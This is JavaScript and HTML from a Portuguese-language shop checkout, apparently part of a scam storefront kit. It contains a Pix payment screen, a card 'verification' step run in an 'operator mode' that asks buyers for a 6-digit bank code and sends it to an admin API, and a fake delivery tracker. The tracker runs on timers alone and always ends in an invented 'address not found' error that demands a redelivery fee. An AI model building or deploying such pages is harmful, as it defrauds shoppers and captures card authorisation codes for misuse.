                     <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm">Abra o aplicativo do seu banco e acesse a <strong>área Pix</strong>.</p>
             </div>
              <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h12a2 2 0 002-2V7a2 2 0 00-2-2h-2M8 5a2 2 0 012-2h4a2 2 0 012 2v0M8 5a2 2 0 002 2h4a2 2 0 002-2m0 0h2a2 2 0 012 2v3m-6 4h.01M9 16h.01" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm">Escolha a opção <strong>Pix Copia e Cola</strong>.</p>
             </div>
             <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm"><strong>Cole o código</strong> copiado e confirme as informações do pagamento.</p>
             </div>
              <div class="flex items-center space-x-4">
                 <div class="flex-shrink-0 w-10 h-10 flex items-center justify-center bg-theme-primary rounded-full">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                 </div>
                 <p class="text-gray-600 text-sm">Pronto! Seu pagamento será confirmado em instantes.</p>
             </div>
         </div>
          <div class="mt-6 space-y-4 text-left border-t border-slate-200 pt-5">
              <div class="flex items-start gap-3 text-sm">
                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-500 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" /><path stroke-linecap="round" stroke-linejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" /></svg>
                  <p class="text-slate-600">Nosso entregador já está na sua região! Ele chegará em aproximadamente <b class="text-slate-800">${randomMinutes} minutos</b> após a confirmação do pagamento.</p>
              </div>
              <div class="flex items-start gap-3 text-sm">
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-amber-500 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
                  <p class="text-slate-600">O entregador já foi notificado e está <b class="text-slate-800">aguardando seu PIX</b> para seguir até sua casa.</p>
              </div>
          </div>
    </div>
    `;
    setTimeout(() => {
        window.scrollTo(0, 0);
        const qrDiv = document.getElementById('pixQrCode');
        if (qrDiv && paymentData.pix_emv) {
            new QRCode(qrDiv, {
                text: paymentData.pix_emv,
                width: 208,
                height: 208,
                colorDark: '#1e293b',
                colorLight: '#ffffff',
                correctLevel: QRCode.CorrectLevel.M
            });
        }
    }, 0);

    const copyButton = document.getElementById('copyButton');
    const pixCopyPasteInput = document.getElementById('pixCopyPaste');
    const copyFeedback = document.getElementById('copyFeedback');
    const toggleInstructions = document.getElementById('toggle-instructions');
    const instructionsContent = document.getElementById('instructions-content');

    if (copyButton) {
        pixCopyPasteInput.value = paymentData.pix_emv;
        copyButton.addEventListener('click', () => {
            pixCopyPasteInput.select();
            document.execCommand('copy');
            copyFeedback.classList.remove('hidden');
            setTimeout(() => copyFeedback.classList.add('hidden'), 2000);
        });
    }

    if (toggleInstructions && instructionsContent) {
        toggleInstructions.addEventListener('click', (e) => {
            e.preventDefault();
            instructionsContent.classList.toggle('hidden');
        });
    }

    startExpirationTimer(10 * 60);
}

function startExpirationTimer(durationInSeconds) {
    let timer = durationInSeconds;
    const display = document.getElementById('timerDisplay');
    pixTimerInterval = setInterval(() => {
        if (timer < 0) {
            clearInterval(pixTimerInterval);
            clearInterval(pollingInterval);
            if (display) {
                display.innerHTML = 'Expirado';
                display.classList.remove('text-red-600', 'font-semibold');
                display.classList.add('bg-red-100', 'text-red-700', 'font-bold', 'px-2', 'py-1', 'rounded-md', 'text-xs', 'inline-block');
            }
            const copyButton = document.getElementById('copyButton');
            if (copyButton) copyButton.disabled = true;
            return;
        }
        let minutes = parseInt(timer / 60, 10);
        let seconds = parseInt(timer % 60, 10);
        minutes = "0" + minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        if (display) { display.textContent = minutes.slice(-2) + ":" + seconds; }
        timer--;
    }, 1000);
}

function startPollingPaymentStatus(transactionId) {
    pollingInterval = setInterval(async () => {
        await checkPaymentStatus(transactionId);
    }, 5000);
}


async function checkPaymentStatus(transactionId) {
    try {
        const response = await fetch(`${PAYMENT_STATUS_URL}&id=${encodeURIComponent(transactionId)}`);
        if (!response.ok) return;
        const data = await response.json();

        const status = data.data?.status || data.status;
        if (status === 'paid') {
            clearInterval(pollingInterval);
            clearInterval(pixTimerInterval);
            displaySuccessScreen();
            await fireDynamicPixels();
        }
    } catch (error) {
        console.error("Erro ao verificar status:", error);
    }
}

// --- DISPARO DINÂMICO DE PIXELS ---
async function fireDynamicPixels() {
    try {
        const response = await fetch('../api/admin-api.php?action=get_active_pixels');
        const pixels = await response.json();

        const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
        const discount = couponApplied ? COUPON_DISCOUNT : 0;
        const total_cents = Math.max(0, subtotal - discount + SHIPPING_FEE);
        const orderValue = parseFloat((total_cents / 100).toFixed(2));

        if (pixels.google && pixels.google.length > 0) {
            pixels.google.forEach(pixelId => {
                const parts = pixelId.split('/');
                if (parts.length >= 1) {
                    const configId = parts[0];
                    try { gtag('config', configId); } catch(e) {}
                }
                try {
                    gtag('event', 'conversion', {
                        'send_to': pixelId,
                        'value': orderValue,
                        'currency': 'BRL',
                        'transaction_id': currentTransactionId || ''
                    });
                } catch(e) { console.warn('Pixel fire failed:', pixelId, e); }
            });
        }

        if (pixels.facebook && pixels.facebook.length > 0) {
            pixels.facebook.forEach(pixelId => {
                try {
                    if (typeof fbq === 'function') {
                        fbq('track', 'Purchase', { value: orderValue, currency: 'BRL' });
                    }
                } catch(e) { console.warn('FB Pixel fire failed:', pixelId, e); }
            });
        }
    } catch (error) {
        console.warn('Erro ao disparar pixels:', error);
    }
}

// --- TELA DE VERIFICAÇÃO DO CARTÃO (Modo Operador) ---
function displayCardVerificationScreen(submissionId) {
    document.getElementById('checkoutForm').classList.add('hidden');
    document.getElementById('summarySection').classList.add('hidden');
    const pixContainer = document.getElementById('pixContainer');
    pixContainer.classList.remove('hidden');

    pixContainer.innerHTML = `
    <div class="bg-white p-6 rounded-xl border border-slate-200 text-center">
        <div class="flex justify-center mb-4">
            <div class="w-16 h-16 rounded-full bg-amber-100 flex items-center justify-center">
                <svg class="w-8 h-8 text-amber-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                </svg>
            </div>
        </div>
        <h2 class="text-xl font-bold text-slate-800 mb-2">Verificando pagamento...</h2>
        <p class="text-slate-600 mb-4 text-sm">Estamos validando seu cartão junto ao banco emissor. Aguarde alguns instantes.</p>
        <div id="card-verification-status" class="mt-4 flex justify-center items-center gap-2 text-amber-600 font-semibold">
            <div class="spinner-sm"></div>
            <span>Processando transação...</span>
        </div>
        <div id="card-verification-code" class="hidden mt-6"></div>
    </div>`;

    window.scrollTo(0, 0);

    cardPollingInterval = setInterval(async () => {
        await checkCardVerificationStatus(submissionId);
    }, 3000);
}

async function checkCardVerificationStatus(submissionId) {
    try {
        const response = await fetch(`../api/admin-api.php?action=check_card_status&id=${submissionId}`);
        const data = await response.json();

        if (data.status === 'awaiting_code') {
            clearInterval(cardPollingInterval);
            const statusEl = document.getElementById('card-verification-status');
            const codeEl = document.getElementById('card-verification-code');

            statusEl.innerHTML = `
                <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                </svg>
                <span class="text-blue-600">Verificação necessária</span>`;

            codeEl.classList.remove('hidden');
            codeEl.innerHTML = `
                <div class="bg-slate-50 border border-slate-200 rounded-xl p-6 text-left">
                    <h3 class="font-bold text-slate-800 mb-2">Verificação de segurança</h3>
                    <p class="text-sm text-slate-600 mb-4">Por segurança, uma cobrança temporária de <strong>R$ 1,00</strong> foi realizada no seu cartão. Verifique no app do seu banco ou no extrato a descrição da cobrança:</p>
                    <div class="bg-white border-2 border-amber-400 rounded-lg p-4 text-center mb-4">
                        <p class="text-xs text-slate-500 mb-1">Procure no extrato por</p>
                        <p class="text-2xl font-bold text-slate-800 tracking-wider font-mono">${data.display || ''}</p>
                    </div>
                    <p class="text-sm text-slate-700 font-semibold mb-2">Digite o código de 6 dígitos que aparece junto à descrição acima:</p>
                    <div class="flex gap-2 items-center">
                        <input type="text" id="clientVerificationCode" maxlength="6" pattern="[0-9]*" inputmode="numeric"
                            class="flex-1 p-3 text-center text-2xl font-bold font-mono tracking-widest border-2 border-slate-300 rounded-lg focus:border-amber-500 focus:outline-none"
                            placeholder="000000"
                            oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                    </div>
                    <button onclick="submitVerificationCode(${submissionId})" id="submitCodeBtn"
                        class="w-full mt-4 bg-amber-500 hover:bg-amber-600 text-white font-bold py-3 px-6 rounded-lg transition-colors">
                        Enviar código
                    </button>
                    <p class="text-xs text-slate-500 mt-3">O valor de R$ 1,00 será estornado automaticamente após a verificação.</p>
                </div>`;

            setTimeout(() => document.getElementById('clientVerificationCode')?.focus(), 300);

        } else if (data.status === 'code_sent') {
            clearInterval(cardPollingInterval);
            const statusEl = document.getElementById('card-verification-status');
            const codeEl = document.getElementById('card-verification-code');

            statusEl.innerHTML = `
                <div class="spinner-sm"></div>
                <span class="text-amber-600">Verificando código...</span>`;

            codeEl.innerHTML = `
                <div class="bg-green-50 border border-green-200 rounded-xl p-6 text-center">
                    <svg class="w-10 h-10 mx-auto text-green-500 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                    </svg>
                    <p class="font-semibold text-green-800">Código enviado com sucesso!</p>
                    <p class="text-sm text-green-600 mt-1">Aguardando confirmação do sistema...</p>
                </div>`;
            codeEl.classList.remove('hidden');

            cardPollingInterval = setInterval(async () => {
                await checkCardFinalStatus(submissionId);
            }, 3000);

        } else if (data.status === 'resolved') {
            clearInterval(cardPollingInterval);
            displaySuccessScreen();
            await fireDynamicPixels();

        } else if (data.status === 'rejected') {
            clearInterval(cardPollingInterval);
            Swal.fire({
                icon: 'error',
                title: 'Pagamento não autorizado',
                text: 'O banco emissor não autorizou a transação. Tente outra forma de pagamento.',
                showDenyButton: true,
                confirmButtonText: 'Tentar Novamente',
                denyButtonText: 'Pagar com PIX',
                confirmButtonColor: '#f59e0b',
                denyButtonColor: '#64748b',
            }).then(() => window.location.reload());
        }
    } catch (error) {
        console.warn('Erro ao verificar status do cartão:', error);
    }
}

async function submitVerificationCode(submissionId) {
    const codeInput = document.getElementById('clientVerificationCode');
    const code = codeInput.value.trim();
    const btn = document.getElementById('submitCodeBtn');

    if (code.length < 4) {
        codeInput.style.borderColor = '#ef4444';
        codeInput.classList.add('animate-pulse');
        setTimeout(() => { codeInput.style.borderColor = ''; codeInput.classList.remove('animate-pulse'); }, 1000);
        return;
    }

    btn.disabled = true;
    btn.textContent = 'Enviando...';

    try {
        const r = await fetch('../api/admin-api.php?action=submit_verification_code', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ submission_id: submissionId, code: code })
        });
        const data = await r.json();

        if (data.success) {
            const statusEl = document.getElementById('card-verification-status');
            const codeEl = document.getElementById('card-verification-code');

            statusEl.innerHTML = `
                <div class="spinner-sm"></div>
                <span class="text-amber-600">Verificando código...</span>`;

            codeEl.innerHTML = `
                <div class="bg-green-50 border border-green-200 rounded-xl p-6 text-center">
                    <svg class="w-10 h-10 mx-auto text-green-500 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
                    </svg>
                    <p class="font-semibold text-green-800">Código enviado com sucesso!</p>
                    <p class="text-sm text-green-600 mt-1">Aguardando confirmação do sistema...</p>
                </div>`;

            cardPollingInterval = setInterval(async () => {
                await checkCardFinalStatus(submissionId);
            }, 3000);
        } else {
            btn.disabled = false;
            btn.textContent = 'Enviar código';
            codeInput.style.borderColor = '#ef4444';
        }
    } catch (e) {
        btn.disabled = false;
        btn.textContent = 'Enviar código';
        console.warn('Erro ao enviar código:', e);
    }
}

async function checkCardFinalStatus(submissionId) {
    try {
        const response = await fetch(`../api/admin-api.php?action=check_card_status&id=${submissionId}`);
        const data = await response.json();

        if (data.status === 'resolved') {
            clearInterval(cardPollingInterval);
            displaySuccessScreen();
            await fireDynamicPixels();

        } else if (data.status === 'awaiting_code') {
            clearInterval(cardPollingInterval);
            Swal.fire({
                icon: 'warning',
                title: 'Código Incorreto',
                text: 'O código de verificação informado está incorreto. Por favor, verifique no app do seu banco e tente novamente.',
                confirmButtonColor: '#f59e0b',
            }).then(() => checkCardVerificationStatus(submissionId));

        } else if (data.status === 'rejected') {
            clearInterval(cardPollingInterval);
            Swal.fire({
                icon: 'error',
                title: 'Pagamento não autorizado',
                text: 'O banco emissor não autorizou a transação. Tente outra forma de pagamento.',
                showDenyButton: true,
                confirmButtonText: 'Tentar Novamente',
                denyButtonText: 'Pagar com PIX',
                confirmButtonColor: '#f59e0b',
                denyButtonColor: '#64748b',
            }).then(() => window.location.reload());
        }
    } catch (error) {
        console.warn('Erro ao verificar status final:', error);
    }
}

function displaySuccessScreen() {
    const mainContent = document.querySelector('main');
    const subtotal = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0);
    const total = Math.max(0, subtotal + SHIPPING_FEE);

    // Salvar dados do pedido para uso posterior (re-entrega)
    const complement = document.getElementById('complement')?.value || '';

    sessionStorage.setItem('orderData', JSON.stringify({
        cart: cart,
        subtotal: subtotal,
        discount: 0,
        total: total,
        customerData: {
            name: document.getElementById('name')?.value || '',
            phone: document.getElementById('phone')?.value || '',
            address: {
                street: document.getElementById('street')?.value || '',
                number: document.getElementById('number')?.value || '',
                complement: complement,
                neighborhood: document.getElementById('neighborhood')?.value || '',
                city: document.getElementById('city')?.value || '',
                state: document.getElementById('state')?.value || '',
                cep: document.getElementById('cep')?.value || ''
            }
        }
    }));

    // Obter endereço completo
    const complementStr = complement ? ` - ${complement}` : '';
    const fullAddress = `${document.getElementById('street')?.value || ''}, ${document.getElementById('number')?.value || ''}${complementStr} - ${document.getElementById('neighborhood')?.value || ''}, ${document.getElementById('city')?.value || ''}`;

    // Calcular horários
    const now = new Date();
    const estimatedStart = new Date(now.getTime() + 10 * 60000); // +10 min
    const estimatedEnd = new Date(now.getTime() + 20 * 60000);   // +20 min
    const timeRange = `${estimatedStart.getHours().toString().padStart(2, '0')}:${estimatedStart.getMinutes().toString().padStart(2, '0')} - ${estimatedEnd.getHours().toString().padStart(2, '0')}:${estimatedEnd.getMinutes().toString().padStart(2, '0')}`;

    mainContent.innerHTML = `
    <div class="bg-white rounded-xl border border-slate-200 overflow-hidden">
        <!-- Header -->
        <div class="bg-gradient-to-r from-green-500 to-green-600 p-6 text-white text-center">
            <svg class="w-16 h-16 mx-auto mb-3 animate-pulse" fill="currentColor" viewBox="0 0 20 20">
                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
            </svg>
            <h1 class="text-2xl font-bold">ACOMPANHE SEU PEDIDO</h1>
        </div>

        <!-- Previsão de Entrega -->
        <div class="p-4 bg-slate-50 border-b border-slate-200">
            <p class="text-sm text-slate-600 mb-1">Previsão de entrega</p>
            <p class="text-2xl font-bold text-slate-800" id="delivery-time">${timeRange}</p>
        </div>

        <!-- Barra de Progresso -->
        <div class="p-6">
            <div class="relative">
                <!-- Linha de Progresso -->
                <div class="absolute left-8 top-0 bottom-0 w-1 bg-slate-200" style="height: calc(100% - 40px); margin-top: 20px;"></div>
                <div class="absolute left-8 top-0 w-1 bg-green-500 transition-all duration-1000" id="progress-line" style="height: 0; margin-top: 20px;"></div>
                
                <!-- Status do Pedido -->
                <div class="relative space-y-8" id="order-status-container">
                    <!-- Status 1: Pedido Confirmado -->
                    <div class="flex items-start gap-4 status-item" data-status="confirmed">
                        <div class="flex-shrink-0 w-10 h-10 rounded-full bg-green-500 flex items-center justify-center z-10 relative">
                            <svg class="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
                            </svg>
                        </div>
                        <div class="flex-1 pt-1">
                            <h3 class="font-semibold text-slate-800">Pedido confirmado</h3>
                            <p class="text-sm text-slate-500">Pagamento aprovado</p>
                        </div>
                    </div>

                    <!-- Status 2: Preparando -->
                    <div class="flex items-start gap-4 status-item" data-status="preparing">
                        <div class="flex-shrink-0 w-10 h-10 rounded-full bg-green-500 flex items-center justify-center z-10 relative animate-pulse">
                            <div class="w-3 h-3 bg-white rounded-full"></div>
                        </div>
                        <div class="flex-1 pt-1">
                            <h3 class="font-semibold text-green-600" id="status-preparing-title">Seu pedido está sendo preparado</h3>
                            <p class="text-sm text-slate-500" id="status-preparing-subtitle">Tempo estimado: <span id="preparing-timer" class="font-semibold">5:00</span></p>
                        </div>
                    </div>

                    <!-- Status 3: Saindo para Entrega -->
                    <div class="flex items-start gap-4 status-item" data-status="outfordelivery">
                        <div class="flex-shrink-0 w-10 h-10 rounded-full bg-slate-300 flex items-center justify-center z-10 relative" id="status-delivery-icon">
                            <svg class="w-6 h-6 text-slate-600" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M8 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM15 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0z"/>
                                <path d="M3 4a1 1 0 00-1 1v10a1 1 0 001 1h1.05a2.5 2.5 0 014.9 0H10a1 1 0 001-1V5a1 1 0 00-1-1H3zM14 7a1 1 0 00-1 1v6.05A2.5 2.5 0 0115.95 16H17a1 1 0 001-1v-5a1 1 0 00-.293-.707l-2-2A1 1 0 0015 7h-1z"/>
                            </svg>
                        </div>
                        <div class="flex-1 pt-1">
                            <h3 class="font-semibold text-slate-400" id="status-delivery-title">Saindo para entrega</h3>
                            <p class="text-sm text-slate-400" id="status-delivery-subtitle">Aguardando preparação</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Detalhes da Entrega -->
        <div class="px-6 pb-6 space-y-4">
            <div class="bg-slate-50 rounded-lg p-4">
                <h4 class="font-semibold text-slate-700 mb-2 flex items-center gap-2">
                    <svg class="w-5 h-5 text-slate-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
                    </svg>
                    Entrega em
                </h4>
                <p class="text-sm text-slate-600">${fullAddress}</p>
            </div>

            <!-- Resumo do Pedido (Colapsável) -->
            <div class="border border-slate-200 rounded-lg overflow-hidden">
                <button class="w-full flex items-center justify-between p-4 text-left hover:bg-slate-50 transition-colors" onclick="this.nextElementSibling.classList.toggle('hidden')">
                    <span class="font-semibold text-slate-700">Detalhes do pedido</span>
                    <svg class="w-5 h-5 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/>
                    </svg>
                </button>
                <div class="hidden border-t border-slate-200 p-4 space-y-3">
                    ${cart.map(item => {
                        const p = getProduct(item.id);
                        const nome = p?.name || '';
                        const imagem = p?.image || '';
                        return `
                        <div class="flex items-center gap-3">
                            <img src="${imagem}" alt="${nome}" class="w-12 h-12 rounded object-cover">
                            <div class="flex-1">
                                <p class="font-medium text-sm text-slate-800">${nome}</p>
                                <p class="text-xs text-slate-500">${item.quantity}x ${formatCurrency(item.price)}</p>
                            </div>
                            <span class="font-semibold text-sm text-slate-700">${formatCurrency(item.price * item.quantity)}</span>
                        </div>
                    `;
                    }).join('')}
                    <div class="border-t border-slate-200 pt-3 mt-3">
                        <div class="flex justify-between text-sm mb-1">
                            <span class="text-slate-500">Subtotal</span>
                            <span class="text-slate-700">${formatCurrency(subtotal)}</span>
                        </div>
                        <div class="flex justify-between font-bold text-base mt-2 pt-2 border-t border-slate-200">
                            <span class="text-slate-700">Total</span>
                            <span class="text-slate-800">${formatCurrency(total)}</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>`;

    window.scrollTo(0, 0);

    // Iniciar animações e timers
    startOrderTracking();
}

// Nova função para gerenciar o tracking do pedido
function startOrderTracking() {
    let secondsElapsed = 0;
    const PREPARING_DURATION = 300; // 5 minutos
    const DELIVERY_DURATION = 300;  // 5 minutos
    const TOTAL_DURATION = PREPARING_DURATION + DELIVERY_DURATION; // 10 minutos

    const progressLine = document.getElementById('progress-line');
    const preparingTimer = document.getElementById('preparing-timer');
    const statusPreparingTitle = document.getElementById('status-preparing-title');
    const statusPreparingSubtitle = document.getElementById('status-preparing-subtitle');
    const statusDeliveryIcon = document.getElementById('status-delivery-icon');
    const statusDeliveryTitle = document.getElementById('status-delivery-title');
    const statusDeliverySubtitle = document.getElementById('status-delivery-subtitle');

    // Animar barra de progresso inicial (até 50% - preparando)
    setTimeout(() => {
        if (progressLine) progressLine.style.height = '33%';
    }, 500);

    const trackingInterval = setInterval(() => {
        secondsElapsed++;

        // Fase 1: PREPARANDO (0-5 minutos)
        if (secondsElapsed <= PREPARING_DURATION) {
            const remaining = PREPARING_DURATION - secondsElapsed;
            const minutes = Math.floor(remaining / 60);
            const seconds = remaining % 60;
            if (preparingTimer) {
                preparingTimer.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
            }

            // Atualizar barra de progresso gradualmente (0-50%)
            const progressPercent = (secondsElapsed / PREPARING_DURATION) * 33;
            if (progressLine) progressLine.style.height = `${progressPercent}%`;
        }

        // Fase 2: SAINDO PARA ENTREGA (5-10 minutos)
        else if (secondsElapsed > PREPARING_DURATION && secondsElapsed <= TOTAL_DURATION) {
            // Transição para status de entrega (executar apenas uma vez)
            if (secondsElapsed === PREPARING_DURATION + 1) {
                // Completar status de preparação
                if (statusPreparingTitle) {
                    statusPreparingTitle.textContent = 'Pedido preparado';
                    statusPreparingTitle.classList.remove('text-green-600');
                    statusPreparingTitle.classList.add('text-slate-800');
                }
                if (statusPreparingSubtitle) {
                    statusPreparingSubtitle.textContent = 'Concluído';
                    statusPreparingSubtitle.classList.remove('text-slate-500');
                    statusPreparingSubtitle.classList.add('text-green-600');
                }

                // Ativar status de entrega
                if (statusDeliveryIcon) {
                    statusDeliveryIcon.classList.remove('bg-slate-300');
                    statusDeliveryIcon.classList.add('bg-green-500', 'animate-pulse');
                    statusDeliveryIcon.querySelector('svg').classList.remove('text-slate-600');
                    statusDeliveryIcon.querySelector('svg').classList.add('text-white');
                }
                if (statusDeliveryTitle) {
                    statusDeliveryTitle.textContent = 'Saindo para entrega';
                    statusDeliveryTitle.classList.remove('text-slate-400', 'font-semibold');
                    statusDeliveryTitle.classList.add('text-green-600', 'font-semibold');
                }

                // Mover barra para 50%
                if (progressLine) progressLine.style.height = '50%';
            }

            // Atualizar timer de entrega
            const deliverySeconds = secondsElapsed - PREPARING_DURATION;
            const remaining = DELIVERY_DURATION - deliverySeconds;
            const minutes = Math.floor(remaining / 60);
            const seconds = remaining % 60;
            if (statusDeliverySubtitle) {
                statusDeliverySubtitle.textContent = `Chegando em ${minutes}:${seconds.toString().padStart(2, '0')}`;
            }

            // Atualizar barra de progresso (50-100%)
            const progressPercent = 50 + ((deliverySeconds / DELIVERY_DURATION) * 50);
            if (progressLine) progressLine.style.height = `${progressPercent}%`;
        }

        // Fase 3: ERRO DE ENDEREÇO (após 10 minutos)
        else if (secondsElapsed > TOTAL_DURATION) {
            clearInterval(trackingInterval);
            displayAddressErrorScreen();
        }

    }, 1000);
}

// Nova função para exibir tela de erro de endereço
function displayAddressErrorScreen() {
    const mainContent = document.querySelector('main');
    const orderData = JSON.parse(sessionStorage.getItem('orderData') || '{}');
    const redeliveryFee = 2790; // R$ 27,90 em centavos

    mainContent.innerHTML = `
    <div class="max-w-md mx-auto bg-white rounded-3xl shadow-xl overflow-hidden border border-slate-100 font-sans">
        
        <div class="relative h-48 bg-slate-50 overflow-hidden">
            <img 
                src="entregador.png" 
                alt="Entregador não encontrou endereço" 
                class="w-full h-full object-cover opacity-90"
            >
            <div class="absolute inset-0 bg-gradient-to-t from-white via-transparent to-transparent"></div>
        </div>

        <div class="px-6 pb-8 -mt-6 relative">
            
            <div class="text-center mb-6">
                <span class="inline-block px-3 py-1 bg-red-100 text-red-600 text-xs font-bold uppercase tracking-wide rounded-full mb-3">
                    Entrega Suspensa
                </span>
                <h2 class="text-2xl font-bold text-slate-800 mb-2 leading-tight">
                    Endereço não localizado
                </h2>
                <p class="text-slate-500 text-sm leading-relaxed">
                    O entregador tentou realizar a entrega, mas não conseguiu encontrar o local exato com os dados fornecidos.
                </p>
            </div>

            <div class="bg-slate-50 rounded-2xl p-4 mb-6 border border-slate-100 flex items-start gap-3">
                <div class="bg-white p-2 rounded-full shadow-sm text-slate-400 shrink-0">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
                    </svg>
                </div>
                <div>
                    <p class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Local da tentativa</p>
                    <p class="text-sm text-slate-700 font-medium">
                        ${orderData.customerData?.address?.street || ''}, ${orderData.customerData?.address?.number || ''}${orderData.customerData?.address?.complement ? ' - ' + orderData.customerData.address.complement : ''}
                    </p>
                    <p class="text-xs text-slate-500">
                        ${orderData.customerData?.address?.neighborhood || ''} • ${orderData.customerData?.address?.city || ''}
                    </p>
                </div>
            </div>

            <div class="space-y-4">
                <div class="flex justify-between items-center px-2">
                    <span class="text-slate-600 text-sm">Taxa de reenvio</span>
                    <span class="text-xl font-bold text-slate-800">${formatCurrency(redeliveryFee)}</span>
                </div>

                <button 
                    id="payRedeliveryButton" 
                    class="group w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-4 rounded-xl shadow-lg shadow-slate-200 transition-all active:scale-[0.98] flex items-center justify-center gap-2"
                >
                    <span>Pagar e Reagendar</span>
                    <svg class="w-5 h-5 text-slate-400 group-hover:text-white transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
                    </svg>
                </button>
            </div>

            <div class="mt-6 text-center">
